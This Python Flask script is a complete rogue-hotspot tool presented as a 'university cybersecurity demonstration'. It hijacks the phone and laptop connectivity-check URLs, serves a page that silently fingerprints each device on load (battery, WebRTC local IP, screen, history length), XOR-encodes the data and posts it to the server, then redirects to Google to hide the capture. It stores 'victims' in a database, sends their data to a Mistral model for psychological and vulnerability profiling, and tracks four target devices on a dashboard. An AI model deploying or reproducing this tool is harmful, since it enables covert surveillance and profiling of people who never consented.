#!/usr/bin/env python3
"""
BlackBox Cyber Framework v3.0 - University Cybersecurity Demonstration
Zero-Interaction Hotspot Data Extraction + AI Profiling
TARGET: 4 Specific Victim Devices
WARNING: Educational purposes only - Rogue AP + Zero-Click risks demo
"""

import os
import json
import base64
import threading
import time
import socket
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect
from rich.live import Live
from rich.table import Table
from rich.text import Text
from rich.console import Console
from rich.panel import Panel
from rich import box
import hashlib
import uuid
import queue

# Initialize console and app
console = Console()
app = Flask(__name__)

# Configuration
HF_TOKEN = os.getenv("HF_TOKEN", "")
TARGET_DEVICE_COUNT = 4
victims_data = []
victims_db_file = "victims_database.json"
ai_queue = queue.Queue()

# Load existing victims database
def load_victims_db():
    global victims_data
    try:
        if os.path.exists(victims_db_file):
            with open(victims_db_file, 'r') as f:
                victims_data = json.load(f)
    except:
        victims_data = []

def save_victims_db():
    try:
        with open(victims_db_file, 'w') as f:
            json.dump(victims_data, f, indent=2)
    except Exception as e:
        console.print(f"[red]Database save error:[/red] {e}")

# Node Identifier & Geo Simulation
def get_node_identifier():
    hostname = socket.gethostname()
    node_id = hashlib.md5(hostname.encode()).hexdigest()[:8]
    return f"node-{node_id}"

def simulate_geolocation(ip):
    locations = ["New York, USA", "London, UK", "Tokyo, Japan", "Sydney, AU"]
    return locations[hash(ip) % len(locations)]

def generate_device_id(fingerprint):
    """Generate unique persistent device ID"""
    ua_hash = hashlib.md5(fingerprint.get('userAgent', '').encode()).hexdigest()
    screen_hash = hashlib.md5(fingerprint.get('screen', '').encode()).hexdigest()
    combined = f"{ua_hash[:8]}{screen_hash[:8]}"
    return combined

# XOR Encryption
def xor_encrypt(data, key="BLACKBOX"):
    key = key.encode()
    data_bytes = data.encode()
    encrypted = bytes(a ^ b for a, b in zip(data_bytes, key * (len(data_bytes) // len(key) + 1)))
    return base64.b64encode(encrypted).decode()

def xor_decrypt(encrypted_data, key="BLACKBOX"):
    key = key.encode()
    data_bytes = base64.b64decode(encrypted_data.encode())
    decrypted = bytes(a ^ b for a, b in zip(data_bytes, key * (len(data_bytes) // len(key) + 1)))
    return decrypted.decode()

# 🧠 HUGGING FACE AI PROFILER (unchanged)
class AIProfiler:
    def __init__(self, hf_token):
        self.hf_token = hf_token
        self.model = "mistralai/Mistral-7B-Instruct-v0.2"
        self.api_url = f"https://api-inference.huggingface.co/models/{self.model}"
        self.headers = {"Authorization": f"Bearer {hf_token}"} if hf_token else {}
    
    def generate_profile(self, fingerprint_data):
        try:
            if not self.hf_token:
                return "❌ Manual Analysis Required"
            
            fp_summary = f"""
OS: {fingerprint_data.get('platform', 'Unknown')}
UA: {fingerprint_data.get('userAgent', 'Unknown')[:80]}...
Screen: {fingerprint_data.get('screen', 'Unknown')}
Battery: {fingerprint_data.get('batteryLevel', 'Unknown')}
Internal IP: {fingerprint_data.get('localIP', 'Unknown')}
Device ID: {fingerprint_data.get('deviceId', 'Unknown')}
            """
            
            system_prompt = """You are a cybersecurity analyst. Analyze this zero-click fingerprint and provide: 1) Psychological profile (1 sentence), 2) Vulnerability assessment (1 sentence)."""
            
            prompt = f"{system_prompt}\n\nData:\n{fp_summary}\n\nAnalysis:"
            
            payload = {
                "inputs": prompt,
                "parameters": {"max_new_tokens": 120, "temperature": 0.7, "return_full_text": False}
            }
            
            response = requests.post(self.api_url, headers=self.headers, json=payload, timeout=10)
            
            if response.status_code == 200:
                result = response.json()
                if isinstance(result, list) and len(result) > 0:
                    return result[0].get('generated_text', '').strip()
            return "⚠️ AI Service Unavailable"
            
        except:
            return "❌ Analysis Failed"

ai_profiler = AIProfiler(HF_TOKEN)

# Async AI Processing Worker
def ai_worker():
    while True:
        try:
            victim_idx = ai_queue.get(timeout=1)
            if 0 <= victim_idx < len(victims_data):
                victim = victims_data[victim_idx]
                if 'ai_insight' not in victim or victim['ai_insight'] == 'Analyzing...':
                    ai_insight = ai_profiler.generate_profile(victim.get('raw_fingerprint', {}))
                    victims_data[victim_idx]['ai_insight'] = ai_insight
                    save_victims_db()
            ai_queue.task_done()
        except:
            continue

# ZERO-INTERACTION CAPTIVE PORTAL (Auto-popup + Zero-click)
@app.route('/')
@app.route('/generate_204')  # Android connectivity check
@app.route('/ncsi.txt')      # Windows connectivity check
@app.route('/connecttest.txt') # iOS connectivity check
@app.route('/portal')
def zero_click_portal():
    """Hijacks ALL connectivity checks and forces zero-click extraction"""
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>WiFi Connected</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { margin: 0; padding: 0; background: #000; overflow: hidden; }
            .loading { 
                position: absolute; top: 50%; left: 50%; 
                transform: translate(-50%, -50%); 
                color: #00ff88; font-family: monospace; 
                font-size: 18px; text-align: center;
            }
            .spinner { border: 4px solid #333; border-top: 4px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="loading">
            <div class="spinner"></div>
            <div>🔐 Securing Connection...</div>
            <div id="status">Initializing...</div>
        </div>

        <script>
        (function() {
            // ZERO-CLICK EXTRACTION - Executes immediately on load
            async function extractZeroClick() {
                try {
                    // Comprehensive device fingerprinting
                    const fp = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        cookies: navigator.cookieEnabled,
                        hardware: navigator.hardwareConcurrency || 'N/A',
                        memory: navigator.deviceMemory || 'N/A',
                        
                        // Battery API (requires HTTPS but works on localhost/tunnel)
                        batteryLevel: navigator.getBattery ? 
                            (await navigator.getBattery()).level * 100 : 'N/A',
                        charging: navigator.getBattery ? 
                            (await navigator.getBattery()).charging : 'N/A',
                        
                        // WebRTC Local IP detection
                        localIP: await new Promise(resolve => {
                            const rtc = new RTCPeerConnection({iceServers:[]});
                            rtc.createDataChannel('', {reliable:false});
                            rtc.onicecandidate = e => {
                                if (e.candidate) {
                                    const ip = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/.exec(e.candidate.candidate)?.[1];
                                    if (ip) resolve(ip);
                                }
                            };
                            rtc.createOffer().then(rtc.setLocalDescription.bind(rtc));
                        }).catch(() => 'N/A'),
                        
                        // Screen orientation + history
                        orientation: screen.orientation ? screen.orientation.type : 'N/A',
                        historyLength: history.length,
                        
                        timestamp: Date.now(),
                        deviceId: ''  // Will be generated server-side
                    };
                    
                    // XOR + Base64 encryption
                    const key = 'BLACKBOX';
                    const dataStr = JSON.stringify(fp);
                    let encrypted = btoa(String.fromCharCode(...Array.from(dataStr, (c, i) => 
                        c.charCodeAt(0) ^ key.charCodeAt(i % key.length))));
                    
                    // SILENT POST to master
                    await fetch('/capture', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({data: encrypted, zero_click: true})
                    });
                    
                    document.getElementById('status').textContent = '✅ Connected!';
                    
                    // GHOST REDIRECT after 2 seconds (looks legitimate)
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 2000);
                    
                } catch(e) {
                    // Silent fail - still redirect
                    setTimeout(() => window.location.href = 'https://www.google.com', 3000);
                }
            }
            
            // EXECUTE IMMEDIATELY
            window.onload = extractZeroClick;
            
        })();
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/capture', methods=['POST'])
def capture_data():
    try:
        data = request.json
        encrypted_payload = data.get('data', '')
        
        # Decrypt
        decrypted = xor_decrypt(encrypted_payload)
        fingerprint = json.loads(decrypted)
        
        # Generate persistent device ID
        device_id = generate_device_id(fingerprint)
        
        victim = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': request.remote_addr,
            'device_id': device_id,
            'node_id': get_node_identifier(),
            'location': simulate_geolocation(request.remote_addr),
            'device': fingerprint.get('userAgent', 'Unknown')[:40],
            'os_platform': fingerprint.get('platform', 'Unknown'),
            'screen': fingerprint.get('screen', 'N/A'),
            'battery': f"{fingerprint.get('batteryLevel', 'N/A')}% {'⚡' if fingerprint.get('charging') else ''}",
            'local_ip': fingerprint.get('localIP', 'N/A'),
            'status': 'Zero-Click Compromised' if data.get('zero_click') else 'Compromised',
            'raw_fingerprint': fingerprint,
            'ai_insight': 'Analyzing...',
            'target_status': 'Active'  # For 4-target tracking
        }
        
        victims_data.append(victim)
        victim_idx = len(victims_data) - 1
        
        # Queue AI analysis
        ai_queue.put(victim_idx)
        
        # Target tracking
        active_targets = len([v for v in victims_data[-TARGET_DEVICE_COUNT:] if v['target_status'] == 'Active'])
        console.print(f"[bold green]🎣 ZERO-CLICK HIT #{active_targets}/{TARGET_DEVICE_COUNT}[/bold green] "
                     f"ID:{device_id[:8]} IP:{victim['ip']} Battery:{victim['battery']}")
        
        save_victims_db()
        return jsonify({'status': 'extracted', 'device_id': device_id})
        
    except Exception as e:
        return jsonify({'status': 'error'}), 400

# Enhanced Dashboard for 4 Targets
def render_dashboard():
    table = Table(title=f"🎯 TARGET EXTRACTION DASHBOARD (Active: {len([v for v in victims_data if v.get('target_status') == 'Active'])}/{TARGET_DEVICE_COUNT})", 
                  box=box.HEAVY, title_style="bold cyan", show_header=True)
    
    table.add_column("Time", style="magenta", width=16)
    table.add_column("Device ID", style="cyan", width=12)
    table.add_column("IP ↔ Local", style="green", width=20)
    table.add_column("Device/Battery", style="yellow", width=20)
    table.add_column("🤖 AI Profile", style="bright_blue")
    
    # Show last TARGET_DEVICE_COUNT + recent captures
    recent_victims = victims_data[-TARGET_DEVICE_COUNT*2:]
    for victim in recent_victims:
        ai_status = victim.get('ai_insight', 'Pending')[:35] + "..."
        target_marker = "🎯" if victim.get('target_status') == 'Active' else ""
        table.add_row(
            victim.get('timestamp', 'N/A')[:16],
            victim.get('device_id', 'N/A')[:12],
            f"{victim.get('ip', 'N/A')} ↔ {victim.get('local_ip', 'N/A')[:12]}",
            f"{victim.get('device', 'N/A')[:15]}... | {victim.get('battery', 'N/A')}",
            f"{target_marker} {ai_status}"
        )
    
    table.caption = f"Zero-Click Extractions: {len(victims_data)} | Node: {get_node_identifier()} | AI Queue: {ai_queue.qsize()}"
    return table

# Main Threads
def dashboard_thread():
    ai_thread = threading.Thread(target=ai_worker, daemon=True)
    ai_thread.start()
    
    with Live(render_dashboard(), refresh_per_second=2, screen=True) as live:
        while True:
            live.update(render_dashboard())
            time.sleep(0.8)

# Kee-Film Style System Diagnostic
def system_diagnostic():
    console.print(Panel.fit(
        Text("🎬 BLACKBOX CYBER FRAMEWORK v3.0\n"
             "Zero-Interaction Hotspot Extraction\n"
             f"🎯 TARGETING {TARGET_DEVICE_COUNT} DEVICES", 
             style="bold cyan", justify="center"),
        title="[KEe FILM] ZERO-CLICK OPS", border_style="bright_green", padding=(1,2)
    ))
    
    public_url = f"https://{get_node_identifier()}.trycloudflare.com"
    
    diag_table = Table(show_header=True, header_style="bold green")
    diag_table.add_column("Status", style="cyan", width=20)
    diag_table.add_column("Details", style="magenta")
    
    diag_table.add_row("🎯 Zero-Click Active", "✅ Hijacks all connectivity checks")
    diag_table.add_row("🌐 Public URL", public_url)
    diag_table.add_row("💾 Targets Database", f"{len(victims_data)} captures")
    diag_table.add_row("🧠 AI Profiler", f"Mistral-7B {'✅' if HF_TOKEN else '⚠️'}")
    diag_table.add_row("🎯 Active Targets", f"{len([v for v in victims_data if v.get('target_status') == 'Active'])}/{TARGET_DEVICE_COUNT}")
    
    console.print(diag_table)
    console.print("\n[bold green blink]⚡ DEPLOYED: Auto-popup extraction active. Connect targets to hotspot![/bold green blink]\n")

if __name__ == '__main__':
    load_victims_db()
    system_diagnostic()
    dashboard_thread()